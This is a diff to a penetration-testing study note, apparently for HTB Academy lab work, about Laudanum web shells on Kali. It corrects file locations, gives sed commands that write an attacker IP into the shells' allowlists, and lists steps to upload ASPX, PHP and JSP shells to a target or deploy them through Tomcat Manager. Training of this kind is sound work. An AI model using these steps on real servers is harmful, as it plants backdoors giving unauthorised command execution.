@@ -25,9 +25,9 @@ ls /usr/share/laudanum/
 ls /usr/share/laudanum/aspx/
 ls /usr/share/laudanum/php/
 
-# Copy to working directory before editing
+# Copy to working directory before editing (php shell is shell.php, NOT php.php)
 cp /usr/share/laudanum/aspx/shell.aspx .
-cp /usr/share/laudanum/php/php.php .
+cp /usr/share/laudanum/php/shell.php .
 ```
 
 ---
@@ -38,9 +38,10 @@ cp /usr/share/laudanum/php/php.php .
 # Copy and edit
 cp /usr/share/laudanum/aspx/shell.aspx .
 
-# Edit: set your IP as the allowed host (around line 1-5)
-# Look for: String allowedIp = "127.0.0.1";
-sed -i 's/127.0.0.1/10.10.14.5/g' shell.aspx
+# The allowlist is an ARRAY (~line 59), not a single string:
+#   string[] allowedIps = new string[] {"::1","192.168.0.1", "127.0.0.1"};
+# Replace one of the entries with your tun0 IP:
+sed -i 's/192.168.0.1/10.10.14.5/' shell.aspx
 ```
 
 Upload to target, then browse to:
@@ -53,23 +54,27 @@ http://target/uploads/shell.aspx
 ## PHP Shell
 
 ```bash
-cp /usr/share/laudanum/php/php.php .
+cp /usr/share/laudanum/php/shell.php .
 
-# Edit allowed IP
-# Look for: $allowedIP = array("127.0.0.1");
-# Change to your tun0 IP
+# Edit allowed IP (~line 47) — it's an array with placeholder IPs:
+#   $allowedIPs = array("192.168.1.55", "12.2.2.2");
+sed -i 's/192.168.1.55/10.10.14.5/' shell.php
 
 # Upload and access
-curl http://target/uploads/php.php
+curl http://target/uploads/shell.php
 ```
 
 ---
 
 ## JSP Shell (Tomcat / Java)
 
+The jsp dir ships a **prebuilt `cmd.war`** (plus `makewar.sh` and a `warfiles/` source dir) — there is no standalone `cmd.jsp`.
+
 ```bash
-cp /usr/share/laudanum/jsp/cmd.jsp .
-# Edit IP restriction, upload to webroot or Tomcat manager
+ls /usr/share/laudanum/jsp/       # cmd.war  makewar.sh  warfiles/
+# Deploy cmd.war via the Tomcat Manager (/manager/html) → browse /cmd/cmd.jsp
+# Or rebuild from warfiles/ after editing the IP restriction:
+cd /usr/share/laudanum/jsp && ./makewar.sh
 ```
 
 ---
@@ -87,12 +92,15 @@ cp /usr/share/laudanum/jsp/cmd.jsp .
 
 ## Shell Locations on Kali
 
+Verified against the Kali package layout (`/usr/share/laudanum/`):
+
 ```
-/usr/share/laudanum/aspx/    → shell.aspx, dns.aspx, file.aspx
-/usr/share/laudanum/php/     → php.php
-/usr/share/laudanum/jsp/     → cmd.jsp
-/usr/share/laudanum/cfm/     → cfmshell.cfm
-/usr/share/laudanum/          → more variants
+aspx/   → shell.aspx
+asp/    → shell.asp, dns.asp, file.asp, proxy.asp
+php/    → shell.php, php-reverse-shell.php, dns.php, file.php, proxy.php, host.php, hidden.php, killnc.php
+jsp/    → cmd.war, makewar.sh, warfiles/   (no standalone cmd.jsp)
+cfm/    → shell.cfm, application.cfc
+wordpress/ , helpers/
 ```
 
 ---
@@ -106,6 +114,10 @@ cp /usr/share/laudanum/jsp/cmd.jsp .
 
 ---
 
+> [!note] **See also** — PowerShell/ASPX web shell with an interactive console: [[Tools/Payloads & Shells/Antak|Antak]]. Cleaner single-file PHP option: [[Tools/Payloads & Shells/WhiteWinterWolf PHP Webshell|WhiteWinterWolf PHP Webshell]]. Getting the shell onto the target: [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]], and the upload-filter bypasses in [[Class notes/HTB Academy/CPTS v2 (claude)/File Upload Attacks|File Upload Attacks]].
+
+---
+
 *Created: 2026-03-13*
-*Updated: 2026-03-13*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-31*
+*Model: claude-opus-5*
